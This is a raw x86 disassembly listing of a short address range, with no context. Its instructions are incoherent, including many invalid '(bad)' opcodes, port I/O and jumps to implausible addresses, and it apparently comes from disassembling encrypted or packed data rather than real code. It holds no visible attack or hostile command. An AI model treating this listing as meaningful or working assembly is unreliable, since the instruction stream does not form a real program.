  4168b0:	lds    edx,FWORD PTR [edi+0x79]
  4168b3:	mov    ebp,0x2b218c2d
  4168b8:	mov    ds:0xe5e3cd71,eax
  4168bd:	(bad)  
  4168be:	pop    edx
  4168bf:	enter  0xafc6,0x29
  4168c3:	ds dec ebx
  4168c5:	mov    esp,0xc26ecb63
  4168ca:	nop
  4168cb:	ja     0x41688d
  4168cd:	(bad)  
  4168ce:	xor    eax,DWORD PTR ds:0x3ef8ada8
  4168d4:	dec    ecx
  4168d5:	out    dx,al
  4168d6:	xor    al,0x9d
  4168d8:	push   edx
  4168d9:	sahf   
  4168da:	mov    ecx,0x25ebbefb
  4168df:	mov    esi,0x39e4d8ed
  4168e4:	fistp  WORD PTR [ecx-0x52c50005]
  4168ea:	pop    ebp
  4168eb:	dec    ebp
  4168ec:	popa   
  4168ed:	ins    DWORD PTR es:[edi],dx
  4168ee:	add    eax,DWORD PTR [ebx+0x1d]
  4168f1:	sub    DWORD PTR [edi+ecx*4],edx
  4168f4:	fadd   DWORD PTR [ebx+0x3db16047]
  4168fa:	or     BYTE PTR [edx+edx*1-0x264dc81],al
  416901:	call   0x43c5ed41
  416906:	xchg   DWORD PTR [ebx+0x409b5d69],ebp
  41690c:	jg     0x41695d
  41690e:	(bad)  
  41690f:	xor    al,0xa
  416911:	mov    dh,0x51
  416913:	sbb    DWORD PTR [edi],ebx
  416915:	mov    cl,0xa7
  416917:	jg     0x416917
  416919:	mov    ebp,0xea1a0ddd
  41691e:	movd   mm0,DWORD PTR [ebp-0x4f]
  416922:	outs   dx,BYTE PTR ds:[esi]
  416923:	cwde   
  416924:	in     al,0xf1
  416926:	push   ss
  416927:	sub    dl,cl
  416929:	sbb    BYTE PTR [ecx+0x15dd682f],0xc2
  416930:	add    ebx,DWORD PTR [ebx-0x385ca6f5]
  416936:	retf   
  416937:	(bad)  [ecx+esi*4]
  41693a:	xor    al,bh
  41693c:	imul   edx,esi,0x39
  41693f:	cli    
  416940:	retf   
  416941:	es sahf 
  416943:	add    al,0x7d
  416945:	sub    DWORD PTR [ecx+0x4e0b4e72],esp
  41694b:	inc    ecx
  41694c:	inc    eax
  41694d:	push   edx
  41694e:	(bad)
  416951:	xchg   ebp,eax
  416952:	adc    al,BYTE PTR [edi-0x19]
  416955:	push   ebx
  416956:	ror    DWORD PTR [eax-0x3a1e575a],0x81
  41695d:	imul   ecx,DWORD PTR [edx-0x73],0x3d80042b
  416964:	iret   
  416965:	dec    ebp
  416966:	sbb    al,0xc1
  416968:	(bad)  
  416969:	jl     0x416950
  41696b:	xchg   ebp,eax
  41696c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41696d:	adc    BYTE PTR [edi+0x5131da2e],cl
  416973:	out    dx,eax
  416974:	mov    eax,0xd036927d
  416979:	stos   BYTE PTR es:[edi],al
  41697a:	sbb    ebp,edx
  41697c:	jecxz  0x416963
  41697e:	xor    eax,ecx
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	or     DWORD PTR [esi+0x1d],esi
  416996:	int    0xa5
  416998:	pop    ds
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0x2570707e
  4169a0:	push   ds
  4169a1:	jl     0x416985
  4169a3:	push   0x9f040a1b
  4169a8:	arpl   WORD PTR [ecx+0x34],si
  4169ab:	push   eax
  4169ac:	sub    eax,DWORD PTR [esi+eax*4]
  4169af:	jecxz  0x416a25
  4169b1:	pushf  
  4169b2:	arpl   WORD PTR [edi-0x7f],si
  4169b5:	cmc    
  4169b6:	ja     0x41697c
  4169b8:	or     esi,DWORD PTR [eax+0x15]
  4169bb:	call   0x38e31c68
  4169c0:	add    ch,BYTE PTR [ebx]
  4169c2:	aad    0x3c
  4169c4:	mov    ebp,0xb6dd7c18
  4169c9:	sbb    BYTE PTR [ebx+0x49],bl
  4169cc:	mov    WORD PTR [ecx+0x78d0545f],ds
  4169d2:	in     eax,dx
  4169d3:	and    al,0xb0
  4169d5:	mov    esp,0x13136bb1
  4169da:	push   ds
  4169db:	inc    ecx
  4169dc:	rol    bh,cl
  4169de:	lds    esi,FWORD PTR [eax]
  4169e0:	add    BYTE PTR [edi*8-0x52ed4984],al
  4169e7:	mov    ah,0x4d
  4169e9:	es dec ebp
  4169eb:	mov    ebx,0x1dcea798
  4169f0:	addr16 dec ecx
  4169f2:	pop    ebx
  4169f3:	mov    dl,0x18
  4169f5:	mov    ?,WORD PTR [esi+ebp*1]
  4169f8:	add    ch,BYTE PTR [esi-0x79]
  4169fb:	enter  0x2acc,0x9a
  4169ff:	sbb    al,0xe6
  416a01:	lahf   
  416a02:	jne    0x4169d7
  416a04:	or     dl,dh
  416a06:	into   
  416a07:	js     0x416a3b
  416a09:	or     bl,BYTE PTR [ecx+0x44dfd2dc]
  416a0f:	pop    ebx
  416a10:	cwde   
  416a11:	ret    
  416a12:	push   edx
  416a13:	repnz sbb eax,0xd5f9a8b9
  416a19:	jp     0x416a41
  416a1b:	inc    eax
  416a1c:	push   ebp
  416a1d:	jp     0x416a82
  416a1f:	jmp    0x3cbb077e
  416a24:	and    DWORD PTR [edi+0x1db2ee56],esp
  416a2a:	fiadd  WORD PTR [eax+0x15cb75a8]
  416a30:	adc    eax,0xfc184125
  416a35:	gs std 
  416a37:	xchg   dh,dl
  416a39:	mov    ds:0x5c70e372,al
  416a3e:	cmp    ebp,DWORD PTR [ebx]
  416a40:	mov    DWORD PTR [edx],eax
  416a42:	out    0x58,eax
  416a44:	jp     0x416a12
  416a46:	cdq    
  416a47:	lds    ecx,FWORD PTR [edx-0x6]
  416a4a:	adc    BYTE PTR [esi-0x1a],bh
  416a4d:	mov    dh,0xb6
  416a4f:	jbe    0x416aa1
  416a51:	jno    0x416a38
  416a53:	or     al,BYTE PTR [edi-0x40e5c71a]
  416a59:	cld    
  416a5a:	call   0xe926db33
  416a5f:	jne    0x416ad3
  416a61:	cmp    al,0xd6
  416a63:	std    
  416a64:	dec    edi
  416a65:	fcomp  QWORD PTR [ecx+0x5e896734]
  416a6b:	pop    esp
  416a6c:	jge    0x416a1d
  416a6e:	sub    al,0x8d
  416a70:	mov    WORD PTR [edx-0x61],es
  416a73:	mov    eax,DWORD PTR [esi]
  416a75:	dec    esi
  416a76:	sub    DWORD PTR [ecx-0x64],edi
  416a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7a:	popf   
  416a7b:	loope  0x416a25
  416a7d:	das    
  416a7e:	inc    ecx
  416a7f:	ss jle 0x416a1d
  416a82:	(bad)  
  416a83:	sbb    ah,BYTE PTR [ecx+0x7c]
  416a86:	test   ebx,ecx
  416a88:	mov    dh,0xdc
  416a8a:	pop    es
  416a8b:	popa   
  416a8c:	cmp    al,dh
  416a8e:	mov    BYTE PTR [eax-0x67],dh
  416a91:	lahf   
  416a92:	mov    esp,0x2a9e42e
  416a97:	stc    
  416a98:	pop    esp
  416a99:	sub    eax,0xa76cc582
  416a9e:	push   edx
  416a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aa0:	das    
  416aa1:	icebp  
  416aa2:	add    dl,BYTE PTR [esi-0x76babd54]
  416aa8:	inc    esi
  416aa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aaa:	arpl   WORD PTR fs:[ebp-0x3b074b3a],bx
  416ab1:	fxtract 
  416ab3:	fwait
  416ab4:	and    eax,DWORD PTR [ebp+0x20ce431e]
  416aba:	cld    
  416abb:	pop    ebp
  416abc:	sahf   
  416abd:	(bad)  
  416abe:	mov    dl,0x50
  416ac0:	(bad)  [ebp+0xb]
  416ac3:	mov    fs,WORD PTR [esi-0x56]
  416ac6:	shl    BYTE PTR [ebx-0x60],1
  416ac9:	mov    dh,0xc4
  416acb:	xchg   ebx,eax
  416acc:	xchg   edx,eax
  416acd:	xchg   ebx,eax
  416ace:	and    bh,BYTE PTR [ebx+eax*1-0x6d]
  416ad2:	sahf   
  416ad3:	xor    BYTE PTR [esi+0x62],0xe5
  416ad7:	popf   
  416ad8:	sub    DWORD PTR [ebx+0x47],esp
  416adb:	sbb    BYTE PTR [edx],bh
  416add:	shl    BYTE PTR [ebx],0xf0
  416ae0:	jo     0x416abb
  416ae2:	or     DWORD PTR [eax],edx
  416ae4:	in     al,0xfc
  416ae6:	xchg   ecx,eax
  416ae7:	pop    esp
  416ae8:	and    BYTE PTR [esi-0x3b],dl
  416aeb:	pop    ss
  416aec:	rol    DWORD PTR [edx],cl
  416aee:	test   DWORD PTR [edx+0x7a],edx
  416af1:	and    dl,al
  416af3:	jbe    0x416ad6
  416af5:	ja     0x416b11
  416af7:	add    al,0x1
  416af9:	mov    al,0xec
  416afb:	mov    ah,0x9f
  416afd:	or     eax,0xfe241925
  416b02:	mov    WORD PTR [edi-0x2f6882d2],?
  416b08:	lea    ecx,[edx-0x171e61aa]
  416b0e:	out    dx,al
  416b0f:	clc    
  416b10:	adc    bl,BYTE PTR [eax]
  416b12:	pop    esi
  416b13:	pop    es
  416b14:	adc    BYTE PTR [ebp+0x670fad5e],0xe5
  416b1b:	push   edi
  416b1c:	jnp    0x416ad2
  416b1e:	mov    DWORD PTR [ebx+0x47],edx
  416b21:	int    0x5a
  416b23:	xchg   BYTE PTR [eax-0x5e9035e5],bl
  416b29:	rcr    DWORD PTR [esi-0x5f],1
  416b2c:	adc    eax,DWORD PTR [eax+esi*8-0x2e0fe05]
  416b33:	test   eax,0x2de1e9
  416b38:	pop    ds
  416b39:	ds jae 0x416ac2
  416b3c:	mov    eax,0x34b6d773
  416b41:	leave  
  416b42:	xor    DWORD PTR [edi],ebp
  416b44:	mov    bl,0x41
  416b46:	ret    0xae23
  416b49:	mov    ecx,0x528448cb
  416b4e:	or     esp,0x2c0c681a
  416b54:	cmp    al,0xe2
  416b56:	js     0x416b2b
  416b58:	mov    eax,0x9ffeb892
  416b5d:	pop    es
  416b5e:	shl    BYTE PTR ds:0x8096c8a2,cl
  416b64:	bound  esp,QWORD PTR [ebp+0x6ca49e5d]
  416b6a:	call   0x98b0:0x3b666f32
  416b71:	pusha  
  416b72:	out    0x4a,al
  416b74:	pop    es
  416b75:	sub    BYTE PTR [ebx+0x40],cl
  416b78:	add    esi,DWORD PTR [eax-0x1aae35f8]
  416b7e:	inc    ebx
  416b7f:	sub    al,0xb8
  416b81:	mov    eax,0x4e2312da
  416b86:	into   
  416b87:	cmp    al,0xea
  416b89:	push   0xffffffed
  416b8b:	adc    cl,ch
  416b8d:	push   ecx
  416b8e:	mov    dh,0x26
  416b90:	out    0x3e,eax
  416b92:	sub    eax,ebp
  416b94:	inc    edx
  416b95:	add    BYTE PTR [eax-0x46684b77],cl
  416b9b:	xchg   ebx,eax
  416b9c:	push   ecx
  416b9d:	stos   BYTE PTR es:[edi],al
  416b9e:	add    eax,0xe72e227c
  416ba3:	xor    al,0x5d
  416ba5:	(bad)  
  416ba6:	js     0x416b58
  416ba8:	mov    BYTE PTR [edx-0x57],0xe7
  416bac:	inc    ecx
  416bad:	push   ss
  416bae:	out    0xc4,al
  416bb0:	fcmovu st,st(3)
  416bb2:	pcmpgtw mm3,QWORD PTR [ecx-0x37]
  416bb6:	dec    edi
  416bb7:	rcl    BYTE PTR [esi+0x56],1
  416bba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bbb:	cld    
  416bbc:	mov    eax,0xfa9685da
  416bc1:	sub    dh,ch
  416bc3:	cmp    eax,DWORD PTR [ecx-0x22]
  416bc6:	arpl   WORD PTR [edi+0x61],ax
  416bc9:	ins    BYTE PTR es:[edi],dx
  416bca:	sub    eax,0x541998d6
  416bcf:	pop    ebp
  416bd0:	dec    esi
  416bd1:	outs   dx,BYTE PTR ds:[esi]
  416bd2:	fcom   QWORD PTR [edx]
  416bd4:	cld    
  416bd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bd6:	jle    0x416bd1
  416bd8:	xor    BYTE PTR [eax-0x37],ah
  416bdb:	or     bl,BYTE PTR [ecx+0x20]
  416bde:	and    al,0xe3
  416be1:	or     DWORD PTR [edi-0x42c494f5],eax
  416be7:	and    cl,dl
  416be9:	or     ah,BYTE PTR [edi-0x62e2009c]
  416bef:	mov    ecx,DWORD PTR [ebp+esi*4-0x52c37e47]
  416bf6:	mov    esi,0x5318d207
  416bfb:	arpl   WORD PTR [edi],si
  416bfd:	inc    esi
  416bfe:	lds    esi,FWORD PTR [edi]
  416c00:	lds    ebx,FWORD PTR [edx+0x5adfb622]
  416c06:	push   esp
  416c07:	test   al,0x45
  416c09:	int    0x0
  416c0b:	dec    eax
  416c0c:	aam    0x76
  416c0e:	mov    eax,ds:0x5af477ca
  416c13:	xor    al,0x57
  416c15:	mov    dl,0x2f
  416c17:	pop    edi
  416c18:	inc    ebp
  416c19:	jbe    0x416c54
  416c1b:	imul   eax,DWORD PTR [ebp+0x35],0x55
  416c1f:	pop    ecx
  416c20:	pop    ecx
  416c21:	loopne 0x416c95
  416c23:	shl    cl,0xfa
  416c26:	mov    cl,0xa8
  416c28:	or     edi,eax
  416c2a:	push   es
  416c2b:	cmp    dl,bh
  416c2d:	das    
  416c2e:	loop   0x416c06
  416c30:	mov    ecx,0x5be2d120
  416c35:	inc    BYTE PTR [bp+si+0x1]
  416c39:	rcr    ebx,0x81
  416c3c:	cmp    DWORD PTR ds:0x18d97ad,edx
  416c42:	add    al,BYTE PTR [ebx]
  416c44:	jo     0x416c7a
  416c46:	ins    BYTE PTR es:[edi],dx
  416c47:	(bad)  
  416c48:	icebp  
  416c49:	cs sbb al,0xc
  416c4c:	cmp    dl,BYTE PTR [edi]
  416c4e:	sub    eax,0x415a1f31
  416c53:	sti    
  416c54:	xchg   esp,eax
  416c55:	jle    0x416cc7
  416c57:	popf   
  416c58:	cmc    
  416c59:	jecxz  0x416cb6
  416c5b:	mov    DWORD PTR [ecx-0x316ffcd],ebx
  416c61:	mov    edi,0x5c14e59f
  416c66:	dec    ecx
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	pushf  
  416c7c:	js     0x416ce0
  416c7e:	imul   dh
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416d06
  416c88:	or     ecx,DWORD PTR [edi]
  416c8a:	adc    DWORD PTR [ebp+0x5a],0x63b529a4
  416c91:	dec    eax
  416c92:	ds dec edx
  416c94:	punpckhbw mm0,mm4
  416c97:	push   ds
  416c98:	(bad)  
  416c99:	lahf   
  416c9a:	inc    edi
  416c9b:	pop    eax
  416c9c:	out    0x44,eax
  416c9e:	cmp    DWORD PTR [eax],0x8
  416ca1:	pop    eax
  416ca2:	shl    BYTE PTR [edx+0x3cfa8d6f],1
  416ca8:	(bad)  
  416ca9:	fst    DWORD PTR [edx]
  416cab:	(bad)  
  416cac:	ins    DWORD PTR es:[edi],dx
  416cad:	inc    ebp
  416cae:	daa    
  416caf:	aam    0x95
  416cb1:	popf   
  416cb2:	shl    ebp,0x1f
  416cb5:	sbb    BYTE PTR [ebx+0x15],cl
  416cb8:	mov    edi,0x8e17f2c4
  416cbd:	dec    esi
  416cbe:	rcr    DWORD PTR [ebx-0x5b6093ef],1
  416cc4:	jg     0x416ce7
  416cc6:	dec    esi
  416cc7:	mov    eax,ds:0x960f1c9b
  416ccc:	into   
  416ccd:	int3   
  416cce:	loope  0x416d13
  416cd0:	adc    BYTE PTR [eax-0x7f],ch
  416cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cd4:	imul   ecx,DWORD PTR [ebp+0x1a5d577d],0x5b
  416cdb:	add    esi,DWORD PTR ds:0x9d593723
  416ce1:	xchg   BYTE PTR [ebx],bl
  416ce3:	int3   
  416ce4:	jmp    0x9ad2964d
  416ce9:	imul   ebp,eax,0xffffff90
  416cec:	dec    ebx
  416ced:	sub    DWORD PTR [eax-0x2d],ebp
  416cf0:	mov    ds:0x49510897,al
  416cf5:	mov    al,0xdc
  416cf7:	outs   dx,DWORD PTR ds:[esi]
  416cf8:	mov    BYTE PTR [eax-0x4bd22ea3],0x80
  416cff:	mov    ebx,0xeb286d69
  416d04:	jo     0x416d7e
  416d06:	rcr    BYTE PTR [ebp+0x70],0x27
  416d0a:	jae    0x416d81
  416d0c:	aaa    
  416d0d:	jno    0x416d0a
  416d0f:	iret   
  416d10:	jns    0x416cdd
  416d12:	sahf   
  416d13:	and    bh,ah
  416d15:	mov    ah,0x70
  416d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d18:	loopne 0x416c9a
  416d1a:	mov    cs,WORD PTR [eax+eax*8]
  416d1d:	aaa    
  416d1e:	add    BYTE PTR [edi-0x1c],al
  416d21:	ret    
  416d22:	iret   
  416d23:	xor    bl,ch
  416d25:	and    eax,0x1d0cf4f4
  416d2b:	mov    ebp,DWORD PTR [edi-0x49]
  416d2e:	adc    BYTE PTR [eax+0x67],0x6d
  416d32:	out    dx,eax
  416d33:	dec    esp
  416d34:	mov    ecx,0xd98fc482
  416d39:	rcr    dl,1
  416d3b:	sti    
  416d3c:	push   0xde50b852
  416d41:	cwde   
  416d42:	mov    eax,ds:0xa2b542da
  416d47:	js     0x416d90
  416d49:	test   DWORD PTR [edx+0xd],ebp
  416d4c:	pop    ecx
  416d4d:	sub    ah,BYTE PTR [ebp+0x5656d88c]
  416d53:	mov    bl,BYTE PTR [ebx]
  416d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d56:	and    eax,0xfaa45101
  416d5b:	inc    esp
  416d5c:	aad    0xda
  416d5e:	ficom  DWORD PTR [ebx]
  416d60:	popf   
  416d61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d62:	cmp    ax,0x41ae
  416d66:	dec    esi
  416d67:	loopne 0x416d50
  416d69:	sbb    DWORD PTR [ebp+eiz*1+0x3989e6b3],ecx
  416d70:	sub    DWORD PTR [ebx-0xf89d05c],esp
  416d76:	popf   
  416d77:	pop    eax
  416d78:	xchg   BYTE PTR [ebx+esi*1-0x36],ch
  416d7c:	popa   
  416d7d:	push   0x6ee96cbd
  416d82:	dec    esi
  416d83:	xor    eax,DWORD PTR [eax-0x64]
  416d86:	ficomp DWORD PTR [edx+edx*4+0x44]
  416d8a:	push   es
  416d8b:	pop    esp
  416d8c:	mov    ebp,0xa5aa6705
  416d91:	rcl    DWORD PTR [esi+0x18914f22],cl
  416d97:	fdivrp st(5),st
  416d99:	aam    0xf1
  416d9b:	mov    dl,0x8f
  416d9d:	cmp    BYTE PTR [edx+0x7e],0xa2
  416da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416da2:	jo     0x416d50
  416da4:	inc    edx
  416da5:	aas    
  416da6:	jns    0x416e00
  416da8:	push   cs
  416da9:	dec    esp
  416daa:	in     al,0x51
  416dac:	push   ecx
  416dad:	dec    ebp
  416dae:	int    0x79
  416db0:	cmp    al,BYTE PTR [edi+eiz*2+0x345bc1d]
  416db7:	cmp    ah,BYTE PTR [edi+0x72]
  416dba:	adc    BYTE PTR [edi+eiz*8],ch
  416dbd:	cmp    bl,0xb8
  416dc0:	xchg   edi,eax
  416dc1:	xchg   edi,eax
  416dc2:	jg     0x416dac
  416dc4:	push   esp
  416dc5:	cdq    
  416dc6:	sbb    BYTE PTR [ecx],ah
  416dc8:	jmp    0xd75:0xa6a89b60
  416dcf:	cmp    ebp,DWORD PTR [eax+0x33]
  416dd2:	pop    eax
  416dd3:	push   edx
  416dd4:	mov    ebp,0x1c0499ef
  416dd9:	sub    al,0x98
  416ddb:	out    dx,eax
  416ddc:	mov    esi,0x49b5abbe
  416de1:	add    edi,esp
  416de3:	aad    0x97
  416de5:	jl     0x416dd6
  416de7:	inc    eax
  416de8:	cmp    ebp,ecx
  416dea:	sub    cl,BYTE PTR [ebx-0x5ad562f]
  416df0:	inc    esp
  416df1:	mov    ds:0xc69b5514,eax
  416df6:	in     eax,0xf0
  416df8:	icebp  
  416df9:	stos   BYTE PTR es:[edi],al
  416dfa:	jecxz  0x416e00
  416dfc:	xor    DWORD PTR [eax-0x1e],esp
  416dff:	lods   al,BYTE PTR ds:[esi]
  416e00:	test   BYTE PTR [ebx-0xa],bl
  416e03:	fst    DWORD PTR [edx]
  416e05:	cld    
  416e06:	dec    esi
  416e07:	shr    DWORD PTR cs:[esi-0xf3b79a9],1
  416e0e:	dec    esi
  416e0f:	out    0x3c,al
  416e11:	adc    BYTE PTR [eax-0x2],0xf7
  416e15:	and    al,0xcb
  416e17:	loope  0x416e36
  416e19:	int    0x80
  416e1b:	sub    ebp,ebp
  416e1d:	dec    esp
  416e1e:	pop    edx
  416e1f:	cmp    DWORD PTR [ecx],edx
  416e21:	push   edi
  416e22:	push   eax
  416e23:	gs in  eax,0xad
  416e26:	daa    
  416e27:	dec    esi
  416e28:	lock inc ebx
  416e2a:	mov    cl,0x1b
  416e2c:	out    0xa0,al
  416e2e:	popf   
  416e2f:	or     eax,0xd7e83ce9
  416e34:	lods   eax,DWORD PTR ds:[esi]
  416e35:	jae    0x416e13
  416e37:	adc    al,bl
  416e39:	sbb    al,0x3e
  416e3b:	pop    ebp
  416e3c:	sub    DWORD PTR [esp+eax*8+0x661a76df],0x818c6972
  416e47:	clc    
  416e48:	xor    DWORD PTR [edi-0x3a],edx
  416e4b:	loopne 0x416def
  416e4d:	xchg   ecx,eax
  416e4e:	jbe    0x416dda
  416e50:	adc    si,WORD PTR [ecx+ecx*1-0x57]
  416e55:	inc    ebx
  416e56:	call   0xa12f762
  416e5b:	int    0xad
  416e5d:	and    DWORD PTR [eax],0x88fe40dd
  416e63:	mov    bh,BYTE PTR [edi+0x6c]
  416e66:	dec    esp
  416e67:	push   edi
  416e68:	sub    bl,BYTE PTR [ecx+0x102e9df0]
  416e6e:	mov    cl,0xd0
  416e70:	push   0xffffffe0
  416e72:	dec    edi
  416e73:	mov    esi,0x82b262dd
  416e78:	dec    eax
  416e79:	mov    ebx,0x9b9e02fb
  416e7e:	cmp    BYTE PTR [edx+ebx*1],ah
  416e81:	ror    bh,1
  416e83:	xchg   DWORD PTR [eax+eiz*4-0x50df8664],esp
  416e8a:	xchg   DWORD PTR [ebx+0x2b9b74a],esi
  416e90:	xlat   BYTE PTR ds:[ebx]
  416e91:	inc    ecx
  416e92:	xchg   ebx,eax
  416e93:	pop    ss
  416e94:	cmc    
  416e95:	or     BYTE PTR [ebx+0x2e],dh
  416e98:	mov    ebp,DWORD PTR [edx+0x71]
  416e9b:	ja     0x416e3f
  416e9d:	or     al,0xda
  416e9f:	jo     0x416ede
  416ea1:	(bad)  
  416ea2:	jne    0x416e42
  416ea4:	lods   eax,DWORD PTR ds:[esi]
  416ea5:	into   
  416ea6:	enter  0x207a,0xb
  416eaa:	fsubr  QWORD PTR [ebp+0x32]
  416ead:	add    eax,0x7c3c8405
  416eb2:	sbb    edx,edx
  416eb4:	jl     0x416e7f
  416eb6:	xchg   edi,eax
  416eb7:	ja     0x416ebc
  416eb9:	repnz lock mov edi,0xfbb5b086
  416ec0:	adc    DWORD PTR [edi+edx*2-0x3f],ebx
  416ec4:	mov    WORD PTR [ebx-0xc79dcb1],fs
  416eca:	adc    esp,eax
  416ecc:	in     eax,dx
  416ecd:	add    eax,0xbf40d344
  416ed2:	push   ebp
  416ed3:	out    0x53,eax
  416ed5:	jecxz  0x416f26
  416ed7:	push   edi
  416ed8:	adc    BYTE PTR [edx-0x7e4e134d],0x4
  416edf:	sbb    al,0xb4
  416ee1:	dec    esi
  416ee2:	outs   dx,DWORD PTR ds:[esi]
  416ee3:	ds add eax,0x9f4a9968
  416ee9:	aam    0xb4
  416eeb:	pop    es
  416eec:	out    dx,eax
  416eed:	outs   dx,BYTE PTR ds:[esi]
  416eee:	mov    esi,DWORD PTR [eax]
  416ef0:	cmp    cl,BYTE PTR [esi]
  416ef2:	and    cl,bl
  416ef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ef5:	ror    BYTE PTR [ebp-0x3a],1
  416ef8:	xchg   esp,eax
  416ef9:	cmp    al,0x6c
  416efb:	mov    al,ds:0xe90ac5dd
  416f00:	adc    ecx,DWORD PTR [edi-0x411b382b]
  416f06:	add    BYTE PTR [ecx+edi*2],cl
  416f09:	ja     0x416ea8
  416f0b:	fchs   
  416f0e:	retf   0x1dd3
  416f11:	(bad)  [esi]
  416f13:	jbe    0x416ed3
  416f15:	popa   
  416f16:	add    al,0x87
  416f18:	jo     0x416eef
  416f1a:	cmp    ch,bh
  416f1c:	sub    al,BYTE PTR [edi+edi*1+0x4a81ff90]
  416f23:	or     dl,BYTE PTR [eax]
  416f25:	add    edi,DWORD PTR [eax]
  416f27:	into   
  416f28:	cmc    
  416f29:	jmp    0x416f7b
  416f2b:	dec    edi
  416f2c:	xor    edx,DWORD PTR [eax+0x2b]
  416f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f30:	inc    ebp
  416f31:	adc    al,0xbd
  416f33:	inc    eax
  416f34:	fcom   st(4)
  416f36:	mov    edi,DWORD PTR [ebx-0x5f]
  416f39:	mov    al,ds:0x2474b1bc
  416f3e:	pop    es
  416f3f:	push   0xeab22804
  416f44:	fistp  QWORD PTR [ecx*4+0x24727c52]
  416f4b:	ret    0xd7e9
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	scas   al,BYTE PTR es:[edi]
  416f6b:	dec    ebp
  416f6c:	scas   al,BYTE PTR es:[edi]
  416f6d:	dec    esi
  416f6e:	aaa    
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0xa870707e
  416f77:	push   ebx
  416f78:	pop    ebx
  416f79:	adc    eax,0xabfe7b83
  416f7e:	int    0x6e
  416f80:	(bad)  
  416f82:	and    ebp,ebp
  416f84:	nop
  416f85:	mov    ebp,0x1f4c79f6
  416f8a:	jmp    0xda55d3c4
  416f8f:	rcl    BYTE PTR [ebp+0x47],cl
  416f92:	or     eax,0x6fea599e
  416f97:	mov    ch,0x3d
  416f99:	ss mov eax,0xca9f8ca8
  416f9f:	mov    esi,0xd01ec5ca
  416fa4:	stos   BYTE PTR es:[edi],al
  416fa5:	xor    DWORD PTR [edi+0x72],ebp
  416fa8:	fld    st(5)
  416faa:	add    eax,0x54075caa
  416faf:	xchg   BYTE PTR [eax+0x4c],cl
  416fb2:	ins    BYTE PTR es:[edi],dx
  416fb3:	push   cs
  416fb4:	mov    bh,0x81
  416fb6:	retf   0x381
  416fb9:	popa   
  416fba:	ret    0x1591
  416fbd:	or     eax,0xc0373f5a
  416fc2:	shr    BYTE PTR [edi+0x390311d5],1
  416fc8:	cmp    eax,0x7ff725e3
  416fcd:	pop    ecx
  416fce:	not    DWORD PTR [esi+0x49]
  416fd1:	mov    bl,0x34
  416fd3:	cwde   
  416fd4:	mov    bl,0xea
  416fd6:	push   edi
  416fd7:	loop   0x416fc9
  416fd9:	sbb    BYTE PTR [esi+ecx*1+0x8],ah
  416fdd:	add    esi,DWORD PTR [eax]
  416fdf:	ror    DWORD PTR ds:0x8a93c7eb,1
  416fe5:	stos   DWORD PTR es:[edi],eax
  416fe6:	fadd   QWORD PTR [ebp+0x2314ca57]
  416fec:	push   ss
  416fed:	or     dh,BYTE PTR [ecx-0x4f0de9f4]
  416ff3:	cld    
  416ff4:	push   edx
  416ff5:	inc    esp
  416ff6:	sti    
  416ff7:	push   0xffffff8c
  416ff9:	in     eax,dx
  416ffa:	repnz in eax,0x6d
  416ffd:	stc    
  416ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fff:	scas   eax,DWORD PTR es:[edi]
  417000:	inc    ebp
  417001:	loopne 0x41705e
  417003:	js     0x416fba
  417005:	pop    esi
  417006:	mov    DWORD PTR [edi-0x1dc7ce34],0x9395d421
  417010:	repz xor DWORD PTR [eax+0x344bf002],ebx
  417017:	mov    esi,0xf2976a0a
  41701c:	in     al,dx
  41701d:	xchg   esi,eax
  41701e:	test   eax,0x1d2d997f
  417023:	sub    dh,bh
  417025:	sahf   
  417026:	cmp    al,0x89
  417028:	fxch   st(1)
  41702a:	ret    0x2048
  41702d:	cmp    bl,BYTE PTR [ebx-0xe]
  417030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417031:	test   eax,0x489f2dec
  417036:	sti    
  417037:	adc    al,0x7f
  417039:	pusha  
  41703a:	retf   0x8294
  41703d:	clc    
  41703e:	fldenv [eax-0x420ccf51]
  417044:	push   0x62
  417046:	ret    0x808a
  417049:	leave  
  41704a:	sbb    eax,0x736baf33
  41704f:	cmp    ch,BYTE PTR [edx-0x41]
  417052:	push   ds
  417053:	ret    
  417054:	pop    ecx
  417055:	jp     0x416ffc
  417057:	mov    al,ds:0x29912bfc
  41705c:	in     eax,dx
  41705d:	cwde   
  41705e:	mov    ah,0x27
  417060:	add    ebp,DWORD PTR [edi+0x10b7a57b]
  417066:	jae    0x41701b
  417068:	into   
  417069:	push   edx
  41706a:	(bad)  
